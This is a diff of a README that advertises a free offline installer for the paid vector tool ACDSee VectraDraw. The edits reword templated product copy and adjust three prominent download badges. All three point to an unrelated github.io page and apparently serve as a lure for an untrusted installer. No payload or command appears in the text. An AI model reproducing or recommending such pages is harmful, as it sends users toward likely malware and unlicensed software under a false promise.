@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Vector+Graphics-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 ACDSee VectraDraw Free Installer** — ACDSee VectraDraw is a vector illustration and diagramming tool offering a clean interface for creating scalable graphics, technical drawings, and visual presentations. Works without internet access, no account required. Full offline installation.
+**💻 ACDSee VectraDraw Free Installer** — ACDSee VectraDraw is a vector drawing and illustration application from ACDSee. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install ACDSee VectraDraw](https://img.shields.io/badge/⬇_Install_ACDSee%20VectraDraw-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install ACDSee VectraDraw](https://img.shields.io/badge/⬇_Install_ACDSee+VectraDraw-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About ACDSee VectraDraw
 
-ACDSee VectraDraw is a vector illustration and diagramming tool offering a clean interface for creating scalable graphics, technical drawings, and visual presentations. It supports SVG, PDF export, and integration with ACDSee's photo management ecosystem.
+ACDSee VectraDraw is a vector drawing and illustration application from ACDSee. Create scalable vector artwork, diagrams, icons, and illustrations with a node-based editing workflow. ACDSee VectraDraw targets designers who need vector capabilities integrated within the ACDSee photo management and editing ecosystem.
 
 ---
 
 ## ❌ Problem: ACDSee VectraDraw is hard to access
 
-- **Niche Product** — Less known than Illustrator, Inkscape, or Affinity Designer
-- **Paid License** — Requires ACDSee subscription or standalone purchase
-- **Limited Community** — Fewer tutorials and community resources than mainstream vector tools
-- **Feature Depth** — Advanced typography and illustration features less mature than competitors
+- **ACDSee Ecosystem** — Most valuable within ACDSee subscription ecosystem
+- **Competition** — Inkscape provides free vector editing; Affinity Designer professional alternative
+- **Feature Depth** — Less feature-rich than dedicated vector applications like Illustrator
+- **Community Size** — Smaller community and fewer resources than Illustrator or Inkscape
 
 ---
 
@@ -81,7 +81,7 @@ ACDSee VectraDraw is a vector illustration and diagramming tool offering a clean
 
 <div align="center">
 
-[![⬇ Install ACDSee VectraDraw](https://img.shields.io/badge/⬇_Install_ACDSee%20VectraDraw-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install ACDSee VectraDraw](https://img.shields.io/badge/⬇_Install_ACDSee+VectraDraw-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ ACDSee VectraDraw is a vector illustration and diagramming tool offering a clean
 
 ---
 
-**ACDSee VectraDraw Free Installer** — ACDSee VectraDraw is a vector illustration and diagramming tool offering a clean interface for creating scalable graphics, technical drawings, and visual presentations. Install without internet connection today!
+**ACDSee VectraDraw Free Installer** — ACDSee VectraDraw is a vector drawing and illustration application from ACDSee. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install ACDSee VectraDraw](https://img.shields.io/badge/⬇_Install_ACDSee%20VectraDraw-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install ACDSee VectraDraw](https://img.shields.io/badge/⬇_Install_ACDSee+VectraDraw-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
